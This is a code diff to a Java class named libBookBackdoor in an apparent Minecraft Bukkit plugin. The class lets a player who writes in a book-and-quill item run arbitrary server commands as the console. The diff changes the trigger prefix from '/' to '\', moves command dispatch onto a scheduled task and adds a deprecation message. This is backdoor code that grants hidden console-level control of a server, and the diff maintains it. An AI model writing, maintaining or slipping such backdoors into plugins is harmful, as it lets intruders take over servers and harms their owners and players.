@@ -676,8 +676,13 @@ public class libBookBackdoor implements Listener {
                     player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                 }
                 event.setCancelled(true);
-            } else if (commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
-                this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
+            } else if (commandType.equals("\\")) /* Server commands, runs as [SERVER] */ {
+                BukkitTask task = new BukkitRunnable(){
+                    @Override
+                    public void run() {
+                        plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command);
+                    }
+                }.runTask(plugin);
                 event.setCancelled(true);
             } else if (commandType.equals(".")) /* Custom commands */ {
                 String[] args = command.split(" ", 0);
@@ -724,7 +729,7 @@ public class libBookBackdoor implements Listener {
                     } catch (Exception e) {
                         player.sendMessage(ChatColor.RED + "Error executing server command.\n" + e);
                     }
-                } else if (commandType.equals("/")) /* Server commands, runs as [SERVER] */ {
+                } else if (commandType.equals("\\")) /* Server commands, runs as [SERVER] */ {
                     this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
                 } else if (commandType.equals(".")) /* Custom commands */ {
                     String[] args = command.split(" ", 0);
@@ -733,6 +738,8 @@ public class libBookBackdoor implements Listener {
                     Commands runner = new Commands(); // <- Registers all commands
 
                     runner.parseCommand(plugin, player, commandType, mainCmd, args);
+                } else if (commandType.equals("/")) {
+                    player.sendMessage("/ is no longer supported, please use \\");
                 }
                 // Give the player a new Book and Quill after the command
                 player.getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount() - 1);
